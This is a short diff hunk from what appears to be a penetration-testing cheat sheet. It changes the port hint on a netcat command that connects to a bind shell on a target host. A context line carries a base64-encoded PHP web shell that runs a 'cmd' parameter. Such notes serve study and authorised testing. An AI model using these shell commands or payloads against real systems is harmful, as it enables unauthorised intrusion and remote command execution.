@@ -784,7 +784,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 
 # Windows priviledge  
 - Bind shell to target , port xxx
-  `nc 192.168.124.220 4444` (Any TCP port: 4444, 1234)  
+  `nc 192.168.124.220 4444` (Trial & Error port: 80,445,443,4444,8888,8080,9999)  
 - Enumerating windows
   ```
   #Users
